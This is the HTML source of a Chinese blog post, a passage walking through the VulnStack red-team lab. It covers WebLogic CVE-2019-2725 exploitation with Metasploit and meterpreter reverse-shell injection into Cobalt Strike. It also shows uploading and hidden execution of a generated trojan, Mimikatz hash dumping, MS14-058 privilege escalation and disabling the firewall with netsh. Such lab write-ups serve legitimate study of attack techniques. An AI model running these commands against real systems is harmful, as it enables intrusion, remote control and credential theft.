@@ -1,0 +1,1702 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#00FFFF">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-corner-indicator.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#00FFFF">
+
+
+
+
+
+  <meta name="keywords" content="域渗透," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="[ATT&amp;amp;CK实战]VulnStack红队（二)">
+<meta name="keywords" content="域渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[域渗透]Vulnstack(二)">
+<meta property="og:url" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;index.html">
+<meta property="og:site_name" content="CyzCc&#39;s blog">
+<meta property="og:description" content="[ATT&amp;amp;CK实战]VulnStack红队（二)">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594131272927.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594124640804.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594124806542.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594125481858.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594125983232.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594127377707.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594128452876.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594129842386.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594165461303.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594195836891.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594196943183.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594197235511.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594197974328.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594198066779.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594197995946.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594198165918.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594199580654.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594199705068.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594200777460.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594200913023.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594202264921.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594210413819.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594210692641.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594203346183.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594211521343.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594203450088.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594211720611.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594212016261.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594212157651.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594212327077.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594212381537.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594212497227.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594214618444.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594216367936.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594216416085.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594216434855.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594216719534.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594216809369.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594219729651.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594217354108.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594217646994.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594217840245.png">
+<meta property="og:updated_time" content="2020-07-14T13:13:25.073Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;07&#x2F;14&#x2F;Vulnstack%E4%BA%8C&#x2F;1594131272927.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://cyzcc.vip/2020/07/14/Vulnstack二/"/>
+
+
+
+
+<!--留言-->
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "9e261f4f"
+    });
+  daovoice('update');
+  </script>
+
+
+  <title>[域渗透]Vulnstack(二) | CyzCc's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">CyzCc's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">♫日常学习笔记整理♬♬</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-主页|随笔">
+          <a href="/home/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            主页|随笔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-一些知识点">
+          <a href="/guestbook/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-comments"></i> <br />
+            
+            一些知识点
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于我">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br />
+            
+            友链
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://cyzcc.vip/2020/07/14/Vulnstack%E4%BA%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="CyzCc">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CyzCc's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">[域渗透]Vulnstack(二)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-14T21:10:49+08:00">
+                2020-07-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/07/14/Vulnstack%E4%BA%8C/" class="leancloud_visitors" data-flag-title="[域渗透]Vulnstack(二)">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>浏览
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.2k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  8
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><strong>[ATT&amp;CK实战]VulnStack红队（二)</strong></p>
+<a id="more"></a>
+
+<p><strong>ATT&amp;CK实战系列二</strong></p>
+<p><strong>知识点</strong></p>
+<blockquote>
+<p>CVE-2019-2725</p>
+<p>msfconsole</p>
+<p>MS14-058 CVE-2014-4113提权</p>
+<p>Cobaltstrike学习</p>
+<p>黄金票据</p>
+<p>。。。。。。</p>
+</blockquote>
+<h1 id="靶机描述"><a href="#靶机描述" class="headerlink" title="靶机描述"></a>靶机描述</h1><p><strong>靶机地址</strong>：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></p>
+<p>红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。本次红队环境主要Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据/白银票据/Sid History/MOF等攻防技术。关于靶场统一登录密码：1qaz@WSX</p>
+<blockquote>
+<ol>
+<li>Bypass UAC</li>
+<li>Windows系统NTLM获取（理论知识：Windows认证）</li>
+<li>Access Token利用（MSSQL利用）</li>
+<li>WMI利用</li>
+<li>网页代理，二层代理，特殊协议代理（DNS，ICMP）</li>
+<li>域内信息收集</li>
+<li>域漏洞利用：SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用</li>
+<li>域凭证收集</li>
+<li>后门技术（黄金票据/白银票据/Sid History/MOF）</li>
+</ol>
+</blockquote>
+<p>拓补图<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594131272927.png" alt="1594131272927"></p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594124640804.png" alt="1594124640804"></p>
+<p>下载好靶机打开vmx文件即可，由于DMZ网段为192.168.111.0/24，所以需要将kali的子网ip设置为192.168.111.0<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594124806542.png" alt="1594124806542"></p>
+<p>web机中需要手动开启服务，在 C:\Oracle\Middleware\user_projects\domains\base_domain\bin 下有一个startWeblogic 的批处理，使用管理员身份运，管理员账号密码：Administrator/1qaz@WSX</p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594125481858.png" alt="1594125481858"></p>
+<p>WEB机和PC机：计算机右键-&gt;管理-&gt;配置-&gt;服务-&gt;Server、Workstation、Computer Browser 全部启动</p>
+<blockquote>
+<p>kali攻击机ip:192.168.111.128</p>
+<p>WEB机ip：192.168.111.80</p>
+</blockquote>
+<h1 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>靶机ip为192.168.111.80<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594125983232.png" alt="1594125983232"></p>
+<p>端口扫描<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594127377707.png" alt="1594127377707"></p>
+<p>发现开放了80和7001两个http端口，在80端口没有发现什么，7001端口为<code>WebLogic Server 10.3.6.0</code>，可使用weblogicscan进行扫描</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 WeblogicScan.py <span class="number">192.168</span><span class="number">.111</span><span class="number">.80</span> <span class="number">7001</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594128452876.png" alt="1594128452876">目标存在CVE-2019-2725漏洞，去网上搜索利用exp<br><a href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-2725" target="_blank" rel="noopener">https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-2725</a></p>
+<p>最终在msf中发现了疑似可以利用的模块<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594129842386.png" alt="1594129842386"></p>
+<h2 id="GETSHELL"><a href="#GETSHELL" class="headerlink" title="GETSHELL"></a>GETSHELL</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">multi</span>/<span class="title">misc</span>/<span class="title">weblogic_deserialize_asyncresponseservice</span></span><br><span class="line"><span class="title">show</span> <span class="title">targets</span></span><br><span class="line"><span class="title">set</span> <span class="title">target</span> 1</span><br><span class="line"><span class="title">show</span> <span class="title">options</span></span><br><span class="line"><span class="title">set</span> <span class="title">rhosts</span> 192.168.111.80</span><br><span class="line"><span class="title">set</span> <span class="title">lhost</span> 192.168.111.128</span><br><span class="line"><span class="title">run</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594165461303.png" alt="1594165461303"></p>
+<p>注意：这里要设置target，否则会显示恶心的<code>Exploit completed, but no session was created.</code>，不知道以前返回这个是否是因为未设置target</p>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="cobaltstrike学习"><a href="#cobaltstrike学习" class="headerlink" title="cobaltstrike学习"></a>cobaltstrike学习</h2><p>在做红日域渗透靶机一的时候由于学得很乱，所以便没有去学习cobaltstrike的使用，今天发现这个工具十分好用而且常用，所以在这里简单的学习一下</p>
+<p>参考链接：<a href="https://www.cnblogs.com/wkzb/p/12431487.html" target="_blank" rel="noopener">https://www.cnblogs.com/wkzb/p/12431487.html</a><br><a href="https://klionsec.github.io/2017/09/23/cobalt-strike/" target="_blank" rel="noopener">https://klionsec.github.io/2017/09/23/cobalt-strike/</a></p>
+<p>Cobaltstrike下载链接: <a href="https://pan.baidu.com/s/1oJPRfh6-2oOUUKJAF0I2_A" target="_blank" rel="noopener">https://pan.baidu.com/s/1oJPRfh6-2oOUUKJAF0I2_A</a> 提取码：3drd</p>
+<p><strong>——cs启动——</strong></p>
+<p>cabaltstrike 工具使用时分为服务端和客户端，启动服务端后可以有很多客户端连接，团队合作使用很方便，实验时也可以服务端客户端在一台机器启动。</p>
+<p>服务端在 kali 启动，命令是：<code>./teamserver 本机 ip 连接密码</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver <span class="number">192.168</span><span class="number">.111</span><span class="number">.128</span> test</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594195836891.png" alt="1594195836891"></p>
+<p>客户端在物理机启动，双击cobaltstrike.bat即可，host填kali的ip，密码为刚才输入的test<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594196943183.png" alt="1594196943183"></p>
+<p><strong>——msf派生权限——</strong></p>
+<p>先在 cs 开启监听，Cobalt Strike-&gt;Listeners-Add，Name 随便填，Host 填写服务端kali的ip，Port 填写服务端设置的端口（在kali启动的时候可以看到<code>port 4444 started！</code>）</p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594197235511.png" alt="1594197235511"></p>
+<p>这个和web靶机的会话端口冲突，修改msf监听端口即可</p>
+<p>这时我们需要已经获得一个shell的会话，将会话ctrl+z放到后台，执行msf命令</p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">windows</span>/<span class="title">local</span>/<span class="title">payload_inject</span></span><br><span class="line"><span class="title">set</span> <span class="title">payload</span> <span class="title">windows</span>/<span class="title">meterpreter</span>/<span class="title">reverse_http</span></span><br><span class="line"><span class="title">set</span> <span class="title">DisablePayloadHandler</span> <span class="title">true</span>   #默认情况下，<span class="title">payload_inject</span>执行之后会在本地产生一个新的<span class="title">handler</span>，由于已经有了一个不需要再产生一个，所以这里设置为<span class="title">true</span></span><br><span class="line"><span class="title">set</span> <span class="title">lhost</span> <span class="title">xxxx</span>                   #<span class="title">cobaltstrike</span>监听的<span class="title">ip</span></span><br><span class="line"><span class="title">set</span> <span class="title">lport</span> <span class="title">xxxx</span>                  #<span class="title">cobaltstrike</span>监听的端口 </span><br><span class="line"><span class="title">set</span> <span class="title">session</span> 1                    #这里是当前获得的<span class="title">session</span>的<span class="title">id</span></span><br><span class="line"><span class="title">exploit</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594197974328.png" alt="1594197974328"></p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594198066779.png" alt="1594198066779"></p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594197995946.png" alt="1594197995946"></p>
+<p>cobaltstrike成功监听到WEB机的shell，右键进入beacon界面即可执行命令<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594198165918.png" alt="1594198165918"></p>
+<p>执行 shell 命令前面加上 shell 就可以了，例如 <code>shell dir</code><br>要使得 Beacon 每秒都多次连接到你，使用 sleep 0 命令。这是「交互式模式」。这种模式下命令 会立即执行</p>
+<p><strong>——制作木马——</strong><br>首先创建监听器用于木马回连，Host 为 cs 服务端的 ip</p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594199580654.png" alt="1594199580654"></p>
+<p>Attacks-&gt;Packages-&gt;Windows Executable 再根据靶机的类型勾选，生成木马</p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594199705068.png" alt="1594199705068"></p>
+<p>生成木马之后将其复制到kali机里面，在msf的会话中使用upload进行上传</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /root/artifact.exe C:\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\artifact.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594200777460.png" alt="1594200777460"></p>
+<p>执行该木马，WEB机成功上线</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execute <span class="comment">#在目标机中执行文件</span></span><br><span class="line">execute -H -i -f artifact.exe <span class="comment"># 创建新进程cmd.exe，-H不可见，-i交互</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594200913023.png" alt="1594200913023"></p>
+<p><strong>——凭据存储——</strong></p>
+<p>密码读取</p>
+<blockquote>
+<p>右键-&gt;Access-&gt;Dump Hashes（需要Administrator权限）</p>
+<p>右键-&gt;Access-&gt;Run Mimikatz</p>
+<p>之后再点击凭证信息</p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594202264921.png" alt="1594202264921"></p>
+</blockquote>
+<p>基本的操作先学到这里，还有一个psexec传递在下文会学习，其它强大的功能远不于此，后面边用边学<del>.</del></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>右键-&gt;执行-&gt;提权</p>
+<p>MS14-058 CVE-2014-4113为一个0day，可直接进行windows提权</p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594210413819.png" alt="1594210413819"></p>
+<p>成功提权为system权限</p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594210692641.png" alt="1594210692641"></p>
+<h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><p><strong>获取当前组的计算机名</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>
+
+<p>这里需要将防火墙手动关闭，否则会出现6118的错误</p>
+<blockquote>
+<p>第一种是刚刚msf反弹回来的输入<br>run post/windows/manage/enable_rdp<br>第二种是在菜刀命令终端下输入<br>netsh advfirewall set allprofiles state off</p>
+</blockquote>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594203346183.png" alt="1594203346183"></p>
+<p>未关闭防火墙只扫出来一个DC机器，将web和PC机器防火墙关闭后便能得到所有机器的信息<br><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594211521343.png" alt="1594211521343"></p>
+<p><strong>查看所有域</strong></p>
